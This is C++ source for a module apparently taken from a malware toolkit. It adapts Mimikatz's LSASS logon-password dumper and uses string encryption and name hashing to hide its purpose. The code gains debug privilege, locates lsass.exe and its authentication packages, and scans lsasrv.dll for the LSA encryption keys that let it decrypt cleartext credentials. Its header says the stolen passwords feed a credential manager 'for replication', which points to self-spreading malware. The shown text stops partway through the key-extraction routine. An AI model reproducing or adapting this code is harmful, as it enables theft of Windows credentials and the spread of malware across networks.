/*
	LogonPasswords.cpp
	Mimikatz's lsass logon data dumper and decryptor
	Query and store cleartext logon data (domain, username, password, etc) to send to CredManager in code module
	Dumped passwords to be used for replication
*/

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "secur32.lib")


#include "..\inc\dbg.h"

#include "..\inc\mem.h"					
#include "..\inc\CryptoStrings.h"		
#include "..\inc\HashedStrings.h"		
#include "..\inc\RandomGen.h"			
#include "..\inc\MyStringRoutines.h"	
#include "..\inc\CredManager.h"			


// internal code modules
#include "globdefs.h"
#include "secpkg.h"
#include "lpmemory.h"
#include "lpprocess.h"

// auth packages for analysis
#include ".\sec_pkg\kerberos.h"
#include ".\sec_pkg\tspkg.h"
#include ".\sec_pkg\wdigest.h"
#include ".\sec_pkg\ssp.h"
#include ".\sec_pkg\livessp.h"

#include "LogonPasswords.h"


// WARN: due to crt absence, these ptrs and offsets should be filled manually at module's start
#ifdef _M_X64
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[] = { 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3 };
#define OFFS_WNT5_g_pRandomKey		- (6 + 2 + 5 + sizeof(long))
#define OFFS_WNT5_g_cbRandomKey		OFFS_WNT5_g_pRandomKey - (3 + sizeof(long))
#define OFFS_WNT5_g_pDESXKey		OFFS_WNT5_g_cbRandomKey - (2 + 5 + sizeof(long))
#define OFFS_WNT5_g_Feedback		OFFS_WNT5_g_pDESXKey - (3 + 7 + 6 + 2 + 5 + 5 + sizeof(long))

BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D };
#define OFFS_WNO8_hAesKey					sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 5 + 3
#define OFFS_WN61_h3DesKey_m					 (2 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 2 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long))
#define OFFS_WN61_InitializationVector		OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 2 + 4 + 3
#define OFFS_WN60_h3DesKey_m					 (6 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 6 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long))
#define OFFS_WN60_InitializationVector		OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 6 + 4 + 3

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D };
#define OFFS_WIN8_hAesKey					sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 4 + 3
#define OFFS_WIN8_h3DesKey_m					 (6 + 2 + 2 + 6 + 3 + 4 + 2 + 4 + 5 + 6 + 2 + 2 + 6 + 5 + 8 + 3 + sizeof(long))
#define OFFS_WIN8_InitializationVector		OFFS_WIN8_hAesKey + sizeof(long) + 3 + 4 + 5 + 6 + 2 + 2 + 6 + 4 + 3

#elif defined _M_IX86
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[] = { 0x84, 0xC0, 0x74, 0x44, 0x6A, 0x08, 0x68 };
#define OFFS_WNT5_g_Feedback		+ sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY)
#define OFFS_WNT5_g_pRandomKey		OFFS_WNT5_g_Feedback + sizeof(long) + 5 + 2 + 2 + 2
#define OFFS_WNT5_g_pDESXKey		OFFS_WNT5_g_pRandomKey + sizeof(long) + 2
#define OFFS_WNT5_g_cbRandomKey		OFFS_WNT5_g_pDESXKey + sizeof(long) + 5 + 2

BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] = { 0x8B, 0xF0, 0x3B, 0xF3, 0x7C, 0x2C, 0x6A, 0x02, 0x6A, 0x10, 0x68 };
#define OFFS_WNO8_hAesKey					- (5 + 6 + sizeof(long))
#define OFFS_WNO8_h3DesKey_m				OFFS_WNO8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 1 + 2 + 2 + 2 + 5 + 1 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 5 + 6 + sizeof(long))
#define OFFS_WNO8_InitializationVector		sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY)

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[] = { 0x8B, 0xF0, 0x85, 0xF6, 0x78, 0x2A, 0x6A, 0x02, 0x6A, 0x10, 0x68 };
#define OFFS_WIN8_hAesKey				- (2 + 6 + sizeof(long))
#define OFFS_WIN8_h3DesKey_m				OFFS_WIN8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 2 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 6 + sizeof(long))
#define OFFS_WIN8_InitializationVector	sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY)
#endif




/*
	Adjusts local privileges to debug
*/
BOOL lpGetDebugPrivileges()
{
	BOOL bRes = FALSE;
	HANDLE hToken = INVALID_HANDLE_VALUE;
	TOKEN_PRIVILEGES tkp = { 0 };
	LPWSTR wszS = NULL;	// decrypt string buffer

	do {	// not a loop

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) { DbgPrint("ERR: OpenProcessToken() failed %04Xh", GetLastError()); break; }

		// SE_DEBUG_NAME                     TEXT("SeDebugPrivilege")
		wszS = CRSTRW("SeDebugPrivilege", "\xfd\x7f\x20\x04\xed\x7f\x13\x09\xc9\x62\xc2\xf9\x0a\xb7\xf2\xc5\x3b\xae\x8c\xa9\x4a\xc2\xf3");
		if (!LookupPrivilegeValue(NULL, wszS, &tkp.Privileges[0].Luid)) { DbgPrint("ERR: LookupPrivilegeValue() failed %04Xh", GetLastError()); break; }
		
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) { DbgPrint("ERR: AdjustTokenPrivileges() failed %04Xh", GetLastError()); break; }

		// done ok result
		DbgPrint("ok");
		bRes = TRUE;

	} while (FALSE);	// not a loop

	// cleanup, if needed
	if (hToken != INVALID_HANDLE_VALUE) { CloseHandle(hToken); }
	if (wszS) { my_free(wszS); }

	return bRes;
}


/*
	Scans process list to find a specific process by it's name hash
	NB: received process name hash in CONSTANT format (uses HashStringW_const() to compare process names)
*/
DWORD _lpGetPIDByHash(UINT64 i64ProcessNameHash)
{
	DWORD dwRes = 0;	// func result
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;	// CreateToolhelp32Snapshot() handle
	PROCESSENTRY32 pe = { 0 };	// iterator's result buffer

	do {	// not a loop

		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (INVALID_HANDLE_VALUE == hSnapshot) { DbgPrint("ERR: CreateToolhelp32Snapshot() failed %04Xh", GetLastError()); break; }

		// init enum structure
		pe.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnapshot, &pe)) {
			do {

				// lowercase string before compare
				sr_lowercase(pe.szExeFile);

				// check
				if (HashStringW_const(pe.szExeFile) == i64ProcessNameHash) {

					DbgPrint("match found [%ws]", pe.szExeFile);
					dwRes = pe.th32ProcessID;
					break;

				} // match

			} while (Process32Next(hSnapshot, &pe));

		} else { DbgPrint("ERR: no processes enumerated"); break; }

	} while (FALSE);	// not a loop

	// cleanup
	if (hSnapshot != INVALID_HANDLE_VALUE) { CloseHandle(hSnapshot); }

	return dwRes;
}

/*
	Allocates and duplicates a copy of passed structure
*/
PKIWI_VERY_BASIC_MODULEENTRY _lpDupModuleInfo(KIWI_VERY_BASIC_MODULEENTRY *leModule)
{
	PKIWI_VERY_BASIC_MODULEENTRY pRes;

	pRes = (PKIWI_VERY_BASIC_MODULEENTRY)my_alloc(sizeof(KIWI_VERY_BASIC_MODULEENTRY));

	// direct copy simple fields
	*pRes = *leModule;

	// copy extra buffer field
	pRes->szModule = (LPWSTR)my_alloc(1024);
	lstrcpyW(pRes->szModule, leModule->szModule);

	return pRes;
}


/*
	Deallocates a structure, previously created by _lpDupModuleInfo()
*/
VOID _lpFreeModuleInfo(KIWI_VERY_BASIC_MODULEENTRY *pModInfo)
{
	my_free(pModInfo->szModule);
	my_free(pModInfo);
}


/*
	NB: received KIWI_VERY_BASIC_MODULEENTRY will be deallocated after this call, so caller
	SHOULD make a copy, including a copy of LPWSTR field to it's internal structure, if needed.
	NB: cannot use rnd xor directly from HashedStrings, because it's functions are from core module, and it's rnd xor is regenerated on this module's buils
	So, define extra internal xor param to avoid constants in code
*/
#define LP_INTERNAL_RND_XOR STRHASH_PARAM(0x2f0bea89756149f4)
BOOL CALLBACK cbLSASSModuleListCallback(KIWI_VERY_BASIC_MODULEENTRY *leModule, LPVOID pCallbackParam)
{
	LP_MODULE_CONTEXT *pContext = (LP_MODULE_CONTEXT *)pCallbackParam;	// cast param as pContext structure
	UINT64 i64ModuleHash; // calc hash of modulename

	// check module name using lowercased hash
	sr_lowercase(leModule->szModule);
	i64ModuleHash = HashStringW_const(leModule->szModule) ^ LP_INTERNAL_RND_XOR;

	// check for interested names
	switch (i64ModuleHash) {

	case HASHSTR_CONST("lsasrv.dll", 0xfd8d40616a72cfcd) ^ LP_INTERNAL_RND_XOR:
		DbgPrint("lsasrv found at %p of size %u", leModule->modBaseAddr, leModule->modBaseSize);
		if (!pContext->pModLSASRV) { pContext->pModLSASRV = _lpDupModuleInfo(leModule); }
		break;

	case HASHSTR_CONST("tspkg.dll", 0xa4bc614cf37a7b6d) ^ LP_INTERNAL_RND_XOR:
		DbgPrint("tspkg found at %p of size %u", leModule->modBaseAddr, leModule->modBaseSize);
		if (!pContext->pModTSPKG) { pContext->pModTSPKG = _lpDupModuleInfo(leModule); }
		break;

	case HASHSTR_CONST("wdigest.dll", 0xadc1a5d389058403) ^ LP_INTERNAL_RND_XOR:
		DbgPrint("wdigest found at %p of size %u", leModule->modBaseAddr, leModule->modBaseSize);
		if (!pContext->pModWDIGEST) { pContext->pModWDIGEST = _lpDupModuleInfo(leModule); }
		break;

	case HASHSTR_CONST("livessp.dll", 0x4523ef70aeca26aa) ^ LP_INTERNAL_RND_XOR:
		DbgPrint("livessp found at %p of size %u", leModule->modBaseAddr, leModule->modBaseSize);
		if ((!pContext->pModLIVESSP) && (pContext->GLOB_Version.dwBuildNumber >= 8000)) { pContext->pModLIVESSP = _lpDupModuleInfo(leModule); }
		break;

	case HASHSTR_CONST("kerberos.dll", 0x606efb774edb5c99) ^ LP_INTERNAL_RND_XOR:
		DbgPrint("kerberos found at %p of size %u", leModule->modBaseAddr, leModule->modBaseSize);
		if (!pContext->pModKERBEROS) { pContext->pModKERBEROS = _lpDupModuleInfo(leModule); }
		break;

	case HASHSTR_CONST("msv1_0.dll", 0x2520acde536d898b) ^ LP_INTERNAL_RND_XOR:
		DbgPrint("msv1_0 found at %p of size %u", leModule->modBaseAddr, leModule->modBaseSize);
		if (!pContext->pModMSV) { pContext->pModMSV = _lpDupModuleInfo(leModule); }
		break;


	} // switch

	return TRUE;
}


/*
	Reads moduleinfo for LSASS process
*/
BOOL lpReadLSASSModulesInfo(LP_MODULE_CONTEXT *pContext)
{

	// call modules iterator with our internal callback func
	return lp_getVeryBasicModulesListForProcess(cbLSASSModuleListCallback, pContext, pContext->hLSASS);

}

bool lpLsaInitializeProtectedMemory_NT6(LP_MODULE_CONTEXT *pContext)
{
	bool resultat = false;

	LPSTR szS;	// decrypt string buffer
	LPWSTR wszBCRYPT_3DES_ALGORITHM, wszBCRYPT_AES_ALGORITHM, wszBCRYPT_OBJECT_LENGTH, wszBCRYPT_CHAINING_MODE, wszBCRYPT_CHAIN_MODE_CBC, wszBCRYPT_CHAIN_MODE_CFB;

	szS = CRSTRA("BCryptOpenAlgorithmProvider", "\xfd\x9f\xfe\x03\xe6\x9f\xdc\x28\xff\x9e\x0e\xff\x22\x77\x3b\xc5\x0c\x4b\x59\xa4\x5f\x2e\x6a\x83\x60\x37\x8c\x64\x9b\xee\xba\x4e\xbf\x42\xcc");
	PBCRYPT_OPEN_ALGORITHM_PROVIDER K_BCryptOpenAlgorithmProvider = reinterpret_cast<PBCRYPT_OPEN_ALGORITHM_PROVIDER>(GetProcAddress(pContext->hBCrypt, szS));
	my_free(szS);

	szS = CRSTRA("BCryptSetProperty", "\xfc\x1f\xc3\x01\xed\x1f\xe1\x2a\xfe\x1e\x33\xfd\x3f\xe2\x17\xf9\x3e\xc8\x73\xac\x5e\xb3\x5a");
	PBCRYPT_SET_PROPERTY K_BCryptSetProperty = reinterpret_cast<PBCRYPT_SET_PROPERTY>(GetProcAddress(pContext->hBCrypt, szS));
	my_free(szS);
	
	szS = CRSTRA("BCryptGetProperty", "\xfe\x5f\x78\x07\xef\x5f\x5a\x2c\xfc\x5e\x88\xfb\x29\xa2\xac\xff\x3c\x88\xc8\xaa\x5c\xf3\xe1");
	PBCRYPT_GET_PROPERTY K_BCryptGetProperty = reinterpret_cast<PBCRYPT_GET_PROPERTY>(GetProcAddress(pContext->hBCrypt, szS));
	my_free(szS);

	szS = CRSTRA("BCryptGenerateSymmetricKey", "\xfe\x9f\x4f\x07\xe4\x9f\x6d\x2c\xfc\x9e\xbf\xfb\x29\x62\x81\xca\x3c\x46\xfb\xaa\x7d\x3e\xc2\x82\x6b\x13\x3d\x66\x8d\xcc\x0a\x56\x98\x51\x4c");
	PBCRYPT_GENERATE_SYMMETRIC_KEY K_BCryptGenerateSymmetricKey = reinterpret_cast<PBCRYPT_GENERATE_SYMMETRIC_KEY>(GetProcAddress(pContext->hBCrypt, szS));
	my_free(szS);

	// prepare some other strings needed
	wszBCRYPT_3DES_ALGORITHM = CRSTRW("3DES", "\xfc\x7f\x1a\x00\xf8\x7f\x49\x2c\xc9\x54\x66");
	wszBCRYPT_AES_ALGORITHM = CRSTRW("AES", "\xfd\x9f\xc0\x03\xfe\x9f\xe1\x2e\xde\x5b\x49");
	wszBCRYPT_OBJECT_LENGTH = CRSTRW("ObjectLength", "\xff\x1f\xa5\x0b\xf3\x1f\x8a\x01\xe5\x02\x46\xf7\x23\xe2\x6b\xc4\x3b\xcf\xb5");
	wszBCRYPT_CHAINING_MODE = CRSTRW("ChainingMode", "\xff\xbf\x43\x0a\xf3\xbf\x60\x0a\xee\xae\xad\xeb\x01\x40\xae\xcd\x2b\x62\x68");
	wszBCRYPT_CHAIN_MODE_CBC = CRSTRW("ChainingModeCBC", "\x00\xe0\xea\x0d\x0f\xe0\xc9\x0d\x11\xf1\x04\xec\xfe\x1f\x07\xca\xd4\x3d\x69\x87\x93\x6c\xc6");
	wszBCRYPT_CHAIN_MODE_CFB = CRSTRW("ChainingModeCFB", "\x00\x60\x33\x0e\x0f\x60\x10\x0e\x11\x71\xdd\xef\xfe\x9f\xde\xc9\xd4\xbd\xb0\x80\x92\x4f\xb3");
		
	if (NT_SUCCESS(K_BCryptOpenAlgorithmProvider(pContext->h3DesProvider, wszBCRYPT_3DES_ALGORITHM, NULL, 0)) &&
		NT_SUCCESS(K_BCryptOpenAlgorithmProvider(pContext->hAesProvider, wszBCRYPT_AES_ALGORITHM, NULL, 0)))
	{
		if (NT_SUCCESS(K_BCryptSetProperty(*pContext->h3DesProvider, wszBCRYPT_CHAINING_MODE, reinterpret_cast<PBYTE>(wszBCRYPT_CHAIN_MODE_CBC), sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) &&
			NT_SUCCESS(K_BCryptSetProperty(*pContext->hAesProvider, wszBCRYPT_CHAINING_MODE, reinterpret_cast<PBYTE>(wszBCRYPT_CHAIN_MODE_CFB), sizeof(BCRYPT_CHAIN_MODE_CFB), 0)))
		{
			DWORD DES3KeyLen, AESKeyLen, cbLen;

			if (NT_SUCCESS(K_BCryptGetProperty(*pContext->h3DesProvider, wszBCRYPT_OBJECT_LENGTH, reinterpret_cast<PBYTE>(&DES3KeyLen), sizeof(DES3KeyLen), &cbLen, 0)) &&
				NT_SUCCESS(K_BCryptGetProperty(*pContext->hAesProvider, wszBCRYPT_OBJECT_LENGTH, reinterpret_cast<PBYTE>(&AESKeyLen), sizeof(AESKeyLen), &cbLen, 0)))
			{

				pContext->DES3Key = new BYTE[DES3KeyLen];
				pContext->AESKey = new BYTE[AESKeyLen];

				resultat = NT_SUCCESS(K_BCryptGenerateSymmetricKey(*pContext->h3DesProvider, (BCRYPT_KEY_HANDLE *)pContext->h3DesKey, pContext->DES3Key, DES3KeyLen, pContext->kiwiRandom3DES, sizeof(pContext->kiwiRandom3DES), 0)) &&
					NT_SUCCESS(K_BCryptGenerateSymmetricKey(*pContext->hAesProvider, (BCRYPT_KEY_HANDLE *)pContext->hAesKey, pContext->AESKey, AESKeyLen, pContext->kiwiRandomAES, sizeof(pContext->kiwiRandomAES), 0));
			}
		}
	}

	// free used vars
	my_free(wszBCRYPT_3DES_ALGORITHM);
	my_free(wszBCRYPT_AES_ALGORITHM);
	my_free(wszBCRYPT_OBJECT_LENGTH);
	my_free(wszBCRYPT_CHAINING_MODE);
	my_free(wszBCRYPT_CHAIN_MODE_CBC);
	my_free(wszBCRYPT_CHAIN_MODE_CFB);

	return resultat;
}


bool lpLsaCleanupProtectedMemory_NT6(LP_MODULE_CONTEXT *pContext)
{
	LPSTR szS;	// decrypt buffer

	szS = CRSTRA("BCryptDestroyKey", "\xff\xdf\x83\x0a\xef\xdf\xa1\x21\xfd\xde\x73\xf6\x2b\x22\x50\xd6\x3d\x08\x3a\x89\x4a\x7e\x59");
	PBCRYTP_DESTROY_KEY K_BCryptDestroyKey = reinterpret_cast<PBCRYTP_DESTROY_KEY>(GetProcAddress(pContext->hBCrypt, szS));
	my_free(szS);

	szS = CRSTRA("BCryptCloseAlgorithmProvider", "\xfc\x7f\xc1\x02\xe0\x7f\xe3\x29\xfe\x7e\x31\xfe\x2f\x8b\x0e\xd9\x29\x86\x6d\xad\x43\xd5\x48\x9e\x64\xea\x91\x78\x83\x11\x88\x4e\xa9\x35\x8b");
	PBCRYTP_CLOSE_ALGORITHM_PROVIDER K_BCryptCloseAlgorithmProvider = reinterpret_cast<PBCRYTP_CLOSE_ALGORITHM_PROVIDER>(GetProcAddress(pContext->hBCrypt, szS));
	my_free(szS);

	if (pContext->h3DesKey)
		K_BCryptDestroyKey(*pContext->h3DesKey);
	if (pContext->hAesKey)
		K_BCryptDestroyKey(*pContext->hAesKey);

	if (pContext->h3DesProvider)
		K_BCryptCloseAlgorithmProvider(*pContext->h3DesProvider, 0);
	if (pContext->hAesProvider)
		K_BCryptCloseAlgorithmProvider(*pContext->hAesProvider, 0);

	if (pContext->DES3Key)
		delete[] pContext->DES3Key;
	if (pContext->AESKey)
		delete[] pContext->AESKey;

	return true;
}


PLIST_ENTRY lpgetPtrFromLinkedListByLuid(LP_MODULE_CONTEXT *pContext, PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind)
{
	PLIST_ENTRY resultat = NULL;
	BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
	PLIST_ENTRY pStruct = NULL;
	if (lp_readMemory(pSecurityStruct, &pStruct, sizeof(pStruct), pContext->hLSASS))
	{
		while (pStruct != pSecurityStruct)
		{
			if (lp_readMemory(pStruct, monBuffer, LUIDoffset + sizeof(LUID), pContext->hLSASS))
			{
				if (RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer)+LUIDoffset)))
				{
					resultat = pStruct;
					break;
				}
			}
			else break;
			pStruct = reinterpret_cast<PLIST_ENTRY>(monBuffer)->Flink;
		}
	}
	delete[] monBuffer;
	return resultat;
}

PVOID lpgetPtrFromAVLByLuid(LP_MODULE_CONTEXT *pContext, PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	if (lp_readMemory(pTable, &maTable, sizeof(RTL_AVL_TABLE), pContext->hLSASS))
		resultat = lpgetPtrFromAVLByLuidRec(pContext, reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.RightChild), LUIDoffset, luidToFind);
	return resultat;
}

PVOID lpgetPtrFromAVLByLuidRec(LP_MODULE_CONTEXT *pContext, PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	if (lp_readMemory(pTable, &maTable, sizeof(RTL_AVL_TABLE), pContext->hLSASS))
	{
		if (maTable.OrderedPointer)
		{
			BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
			if (lp_readMemory(maTable.OrderedPointer, monBuffer, LUIDoffset + sizeof(LUID), pContext->hLSASS))
			{
				if (RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer)+LUIDoffset)))
					resultat = maTable.OrderedPointer;
			}
			delete[] monBuffer;
		}

		if (!resultat && maTable.BalancedRoot.LeftChild)
			resultat = lpgetPtrFromAVLByLuidRec(pContext, reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.LeftChild), LUIDoffset, luidToFind);
		if (!resultat && maTable.BalancedRoot.RightChild)
			resultat = lpgetPtrFromAVLByLuidRec(pContext, reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.RightChild), LUIDoffset, luidToFind);
	}
	return resultat;
}



/*
	Reads encryption keys into context structure
*/
BOOL lpReadLSASSEncryptionKeys(LP_MODULE_CONTEXT *pContext)
{
	BOOL bRes = FALSE;
	LPSTR szS1, szS2;
	LPWSTR wszLsasrv;

	if (!pContext->hLSASS) { DbgPrint("ERR: hLSASS not defined"); return bRes; }
	if (!pContext->pModLSASRV) { DbgPrint("ERR: pModLSASRV not defined"); return bRes; }
	
		MODULEINFO mesInfos;
		if (GetModuleInformation(GetCurrentProcess(), pContext->hLsaSrv, &mesInfos, sizeof(MODULEINFO)))
		{
			DbgPrint("got imgbase of lsasrv.dll at %p", mesInfos.lpBaseOfDll);

			PBYTE addrMonModule = reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			if (!pContext->SeckPkgFunctionTable)
			{
				szS1 = CRSTRA("LsaIRegisterNotification", "\x00\x40\x24\x0d\x18\x40\x08\x16\x11\x71\xf6\xe0\xf7\xb1\xf7\xd1\xd5\x8a\xaa\xaa\xa4\xf1\xa2\x8c\x93\xd9\x50\x6c\x7f\x36\x06");
				szS2 = CRSTRA("LsaICancelNotification", "\xfd\x5f\xa5\x04\xeb\x5f\x89\x1f\xec\x6e\x66\xed\x03\xa4\x60\xc0\x03\x88\x11\xa5\x4b\xee\x26\x8d\x79\xce\xca\x62\x7b\xac\x3c");
				wszLsasrv = CRSTRW("lsasrv", "\xff\x3f\x89\x0b\xf9\x3f\x85\x10\xee\x34\x7b\xf5\x4e\x4f\x96");

				struct { PVOID LsaIRegisterNotification; PVOID LsaICancelNotification; } extractPkgFunctionTable = { GetProcAddress(pContext->hLsaSrv, szS1), GetProcAddress(pContext->hLsaSrv, szS2) };
				if (extractPkgFunctionTable.LsaIRegisterNotification && extractPkgFunctionTable.LsaICancelNotification)
					lp_genericPatternSearch(reinterpret_cast<PBYTE *>(&pContext->SeckPkgFunctionTable), wszLsasrv, reinterpret_cast<PBYTE>(&extractPkgFunctionTable), sizeof(extractPkgFunctionTable), -FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification), NULL, true, true);
			
				my_free(szS1);
				my_free(szS2);
				my_free(wszLsasrv);
			}

			PBYTE ptrBase = NULL;
			DWORD mesSucces = 0;
			if (pContext->GLOB_Version.dwMajorVersion < 6)
			{

				DbgPrint("os ver less 6");

				if (lp_searchMemory(addrMonModule, addrMonModule + mesInfos.SizeOfImage, PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &ptrBase, sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY)))
				{

					DbgPrint("initial ptrbase=%p", ptrBase);

#ifdef _M_X64
					PBYTE g_Feedback = reinterpret_cast<PBYTE  >((ptrBase OFFS_WNT5_g_Feedback) + sizeof(long) + *reinterpret_cast<long *>(ptrBase OFFS_WNT5_g_Feedback));
					pContext->g_pRandomKey = reinterpret_cast<PBYTE *>((ptrBase OFFS_WNT5_g_pRandomKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase OFFS_WNT5_g_pRandomKey));
					pContext->g_pDESXKey = reinterpret_cast<PBYTE *>((ptrBase OFFS_WNT5_g_pDESXKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase OFFS_WNT5_g_pDESXKey));
					PDWORD g_cbRandomKey = reinterpret_cast<PDWORD >((ptrBase OFFS_WNT5_g_cbRandomKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase OFFS_WNT5_g_cbRandomKey));
#elif defined _M_IX86
					PBYTE g_Feedback = *reinterpret_cast<PBYTE  *>(ptrBase  OFFS_WNT5_g_Feedback);
					pContext->g_pRandomKey = *reinterpret_cast<PBYTE **>(ptrBase  OFFS_WNT5_g_pRandomKey);
					pContext->g_pDESXKey = *reinterpret_cast<PBYTE **>(ptrBase  OFFS_WNT5_g_pDESXKey);
					PDWORD g_cbRandomKey = *reinterpret_cast<PDWORD *>(ptrBase  OFFS_WNT5_g_cbRandomKey);
#endif
					DbgPrint("found ptrs at lsasrv: g_Feedback=%p g_pRandomKey=%p g_pDESXKey=%p g_cbRandomKey=%p", g_Feedback, pContext->g_pRandomKey, pContext->g_pDESXKey, g_cbRandomKey);

					*g_Feedback = NULL; *pContext->g_pRandomKey = NULL; *pContext->g_pDESXKey = NULL; *g_cbRandomKey = NULL;

					mesSucces = 0;
					if (!lp_readMemory(pContext->pModLSASRV->modBaseAddr + (g_Feedback - addrMonModule), g_Feedback, 8, pContext->hLSASS)) { DbgPrint("ERR: f1"); return bRes; }
						mesSucces++;
					if (!lp_readMemory(pContext->pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_cbRandomKey)-addrMonModule), g_cbRandomKey, sizeof(DWORD), pContext->hLSASS)) { DbgPrint("ERR: f2"); return bRes; }
						mesSucces++;
					if (lp_readMemory(pContext->pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(pContext->g_pRandomKey) - addrMonModule), &ptrBase, sizeof(PBYTE), pContext->hLSASS))
					{
						mesSucces++;
						*pContext->g_pRandomKey = new BYTE[*g_cbRandomKey];
						if (!lp_readMemory(ptrBase, *pContext->g_pRandomKey, *g_cbRandomKey, pContext->hLSASS)) { DbgPrint("ERR: f5"); return bRes; }
							mesSucces++;
					} else { DbgPrint("ERR: f3"); return bRes; }
					if (lp_readMemory(pContext->pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(pContext->g_pDESXKey) - addrMonModule), &ptrBase, sizeof(PBYTE), pContext->hLSASS))
					{
						mesSucces++;
						*pContext->g_pDESXKey = new BYTE[144];
						if (!lp_readMemory(ptrBase, *pContext->g_pDESXKey, 144, pContext->hLSASS)) { DbgPrint("ERR: f6"); return bRes; }
							mesSucces++;
					} else { DbgPrint("ERR: f4"); return bRes; }
				} else { DbgPrint("mod_memory::searchMemory NT5 error %04Xh", GetLastError()); }

				bRes = (mesSucces == 6);
				DbgPrint("res %u steps %u of %u", bRes, mesSucces, 6);
			}
			else
			{
				DbgPrint("os ver ge 6");

				PBYTE PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
				ULONG SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
				SIZE_T OFFS_WNT6_hAesKey, OFFS_WNT6_h3DesKey_m, OFFS_WNT6_InitializationVector;
				if (pContext->GLOB_Version.dwBuildNumber < 8000)
				{
					PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WNO8_LsaInitializeProtectedMemory_KEY;
					SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
					OFFS_WNT6_hAesKey = OFFS_WNO8_hAesKey;
#ifdef _M_X64
					if (pContext->GLOB_Version.dwMinorVersion < 1)
					{
						OFFS_WNT6_h3DesKey_m = OFFS_WN60_h3DesKey_m;
						OFFS_WNT6_InitializationVector = OFFS_WN60_InitializationVector;
					}
					else
					{
						OFFS_WNT6_h3DesKey_m = OFFS_WN61_h3DesKey_m;
						OFFS_WNT6_InitializationVector = OFFS_WN61_InitializationVector;
					}
#elif defined _M_IX86
					OFFS_WNT6_h3DesKey_m = OFFS_WNO8_h3DesKey_m;
					OFFS_WNT6_InitializationVector = OFFS_WNO8_InitializationVector;
#endif
				}
				else
				{
					PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WIN8_LsaInitializeProtectedMemory_KEY;
					SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
					OFFS_WNT6_hAesKey = OFFS_WIN8_hAesKey;
					OFFS_WNT6_h3DesKey_m = OFFS_WIN8_h3DesKey_m;
					OFFS_WNT6_InitializationVector = OFFS_WIN8_InitializationVector;
				}

				if (lp_searchMemory(addrMonModule, addrMonModule + mesInfos.SizeOfImage, PTRN_WNT6_LsaInitializeProtectedMemory_KEY, &ptrBase, SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY))
				{
#ifdef _M_X64
